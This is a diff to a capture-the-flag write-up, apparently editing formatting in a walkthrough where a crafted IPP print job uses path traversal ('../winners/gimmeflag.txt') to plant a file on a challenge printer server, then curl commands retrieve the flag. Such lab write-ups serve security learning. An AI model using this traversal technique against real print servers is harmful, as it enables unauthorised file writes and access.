@@ -133,15 +133,18 @@ This results in `filename` becoming `/tmp/printjobs/../winners/gimmeflag.txt`, e
 
 Running the script generates `test.ipp` which we send to the server:
 
-```py
+```bash
 curl -X POST --data-binary @test.ipp -H "Content-Type: application/ipp" http://printer.commission.freedonia.vote:80/printers/votes -v
 ```
 
 The server receives our file, which we can then read with:
 
-`curl http://printer.commission.freedonia.vote:80/files/gimmeflag.txt`
+```bash
+curl http://printer.commission.freedonia.vote:80/files/gimmeflag.txt
+```
 
-print
+<img width="928" height="501" alt="print" src="https://github.com/user-attachments/assets/87a71341-d26f-4f7b-aa1b-99565bbb69ee" />
+
 
 `cysea{cant_trust_anything_these_days_31fe6ba0a0}`
 
